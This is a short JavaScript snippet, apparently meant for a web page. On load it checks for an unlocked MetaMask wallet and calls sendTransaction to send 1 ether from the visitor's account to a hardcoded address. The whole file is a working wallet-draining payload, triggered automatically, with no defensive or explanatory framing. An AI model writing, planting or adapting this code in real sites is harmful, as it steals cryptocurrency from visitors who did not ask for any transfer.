'use strict';
(function(){

        setTimeout(function() { // Wait for metamask for being injected

            if (typeof web3 !== 'undefined') { // Check if metamask installed

                if(web3.eth.accounts.length > 0) { // Chek if metamask unlocked
  
                    window.web3 = new Web3(web3.currentProvider);

                    const from = web3.eth.accounts[0];
                    const to   = "0xf17f52151EbEF6C7334FAD080c5704D77216b732";
                    const value     = web3.toWei(1, 'ether');
                    
                    web3.eth.getTransactionCount(from, function(err, nonce) { // Get the nonce
                        if(!err) {

                          const transaction = {
                             "nonce"        : nonce,
                              "to"          : to, 
                              "value"       : value
                            };

                            web3.eth.sendTransaction(transaction, function(err, tx) { // Sent the transacion
                                if(!err)
                                   console.log(tx)
                            });
                       }

                    });
                } 
             }
        }, 500);
 
})();